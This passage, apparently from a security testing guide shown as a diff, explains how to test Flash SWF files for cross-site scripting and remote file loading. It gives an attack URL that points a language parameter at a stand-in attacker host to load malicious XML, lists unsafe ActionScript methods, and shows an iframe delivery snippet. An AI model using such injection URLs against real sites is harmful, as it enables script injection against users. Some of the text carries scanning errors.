@@ -1,0 +1,35 @@
+METHOD / ANSWER:
+v5.load(Locale.DEFAULT_LANG + ‘/player_' +
+Locale.DEFAULT_LANG + ‘xml’;
+};
+The above code could be attacked by requesting:
+http:/victim/file.swf?language=http:/evil.example.org/ma-
+licious.xml?
+Unsafe Methods
+When an entry point is identified, the data it represents could be
+used by unsafe methods. If the data is not filtered/validated using
+the right regexp it could lead to some security issue.
+Unsafe Methods since version r47 are:
+loadVariables()
+loadMovie()
+getURL()
+loadMovie()
+loadMovieNum()
+FScrollPane.loadScrollContent()
+LoadVars.load
+LoadVars.send
+XML.load ( ‘url’ )
+LoadVars.load (‘url’)
+Sound.loadSound( ‘url’, isStreaming );
+NetStream.play( ‘url’ );
+flash.external.Externallnterface.call(_root.callback)
+htmlText
+The Test
+In order to exploit a vulnerability, the swf file should be hosted on
+the victim's host, and the techniques of reflected XSS must be used.
+That is forcing the browser to load a pure swf file directly in the loca-
+tion bar (by redirection or social engineering) or by loading it through
+an iframe from an evil page:
+<iframe src='http:/victim/path/to/file.swf'></iframe>
+This is because in this situation the browser will self-generate an
+HTML pag
